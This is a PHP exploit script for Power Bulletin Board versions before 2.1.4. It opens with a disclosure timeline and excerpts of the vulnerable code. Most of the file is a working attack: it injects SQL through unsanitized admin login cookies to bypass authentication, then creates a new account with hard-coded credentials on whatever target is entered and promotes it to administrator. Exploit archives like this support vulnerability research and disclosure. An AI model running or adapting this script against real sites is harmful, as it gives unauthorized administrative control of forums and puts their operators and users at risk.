<?
/*
+ Application : Power Bulletin Board < 2.1.4
| Download : pbboard.com
| By Faris , AKA i-Hmx
| n0p1337@gmail.com
+ sec4ever.com , 1337s.cc

Time line :
 > 14/7/2012 , Vulnerability discovered
 > 30/7/2012 , Vendor Reported
 > 31/7/2012 , patch released
 > 01/8/2012 , Public disclosure
 

engine/engine.class.php
 		$this->_CONF['admin_username_cookie']	=	'PowerBB_admin_username';
 		$this->_CONF['admin_password_cookie']	=	'PowerBB_admin_password';
admin/common.module.php
		if (!empty($username)
			and !empty($password))
		{
			$CheckArr 				= 	array();
			$CheckArr['username'] 	= 	$username;
			$CheckArr['password'] 	= 	$password;

			$CheckMember = $PowerBB->member->CheckAdmin($CheckArr);

			if ($CheckMember != false)
			{
				$PowerBB->_CONF['rows']['member_row'] = 	$CheckMember;
				$PowerBB->_CONF['member_permission'] 	= 	true;
			}
			else
			{
				$PowerBB->_CONF['member_permission'] = false;
			}

		}
Function CheckAdmin is called from
engine/systyms/member.class.php
go deeper and deeper till u find the vulnerable query
this can be used to bypass login rules as cookies are not sanitized before being called for login confirmation
*/
echo "\n+-------------------------------------------+\n";
echo "|          PBulletin Board < 2.1.4          |\n";
echo "|    Auth Bypass vuln / Admin add Exploit   |\n";
echo "|                  By i-Hmx                 |\n";
echo "|             n0p1337@gmail.com             |\n";
echo "+-------------------------------------------+\n";
echo "\n| Enter Target # ";
function get($url,$post,$cookies){
$curl=curl_init();
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
curl_setopt($curl,CURLOPT_URL,"http://".$url);
curl_setopt($curl, CURLOPT_POSTFIELDS,$post);
curl_setopt($curl,CURLOPT_COOKIE,$cookies);
//curl_setopt($curl, CURLOPT_REFERER, $reffer);
curl_setopt($curl,CURLOPT_FOLLOWLOCATION,0);
curl_setopt($curl,CURLOPT_TIMEOUT,20);
curl_setopt($curl, CURLOPT_HEADER, true); 
$exec=curl_exec($curl);
curl_close($curl);
return $exec;
}
function kastr($string, $start, $end){
		$string = " ".$string;
		$ini = strpos($string,$start);
		if ($ini == 0) return "";
		$ini += strlen($start);
		$len = strpos($string,$end,$ini) - $ini;
		return substr($string,$ini,$len);
}
$vic=str_replace('http://','',trim(fgets(STDIN)));
if($vic==''){exit();}
$log=fopen('faris.txt','w+');
$ran=rand(10000,20000);
echo "| Adding New User\n";
$add=get($vic.'/admin.php?page=member&add=1&start=1',"username=f4ris_$ran&password=sec4ever1337s&email=n0p1337_$ran@gmail.com&gender=m&submit=%D9%85%D9%88%D8%A7%D9%81%D9%82","PowerBB_admin_username=faris' or id='1; PowerBB_admin_password=faris' or password like '%;PowerBB_username=faris' or id='1;PowerBB_password=faris' or password like '%");
$myid=kastr($add,'main=1&id=','">');
if($myid==''){exit("| Exploitation Failed\n   - Magic_Quotes Maybe on or wrong path\n+ Exit");}
echo "| User Data :\n   + UserName : f4ris_$ran\n   + Password : sec4ever1337s\n   + User ID : $myid\n";
echo "| Updating User privileges\n";
$update=get($vic."admin.php?page=member&edit=1&start=1&id=$myid","username=f4ris_$ran&new_username=f4ris_$ran&new_password=sec4ever1337s&email=n0p1337_$ran@gmail.com&usergroup=1&gender=m&style=1&lang=1&avater_path=&user_info=&user_title=F4r54wy&posts=0&website=sec4ever.com&month=0&day=0&year=&user_country=&ip=&warnings=0&reputation=10&hide_online=0&user_time=&send_allow=1&pm_emailed=0&pm_window=1&visitormessage=1&user_sig=&review_subject=0&review_reply=0&submit=%D9%85%D9%88%D8%A7%D9%81%D9%82","PowerBB_admin_username=faris' or id='1; PowerBB_admin_password=faris' or password like '%;PowerBB_username=faris' or id='1;PowerBB_password=faris' or password like '%");
echo "+ Exploitatin Done ;)\n";
exit();
?>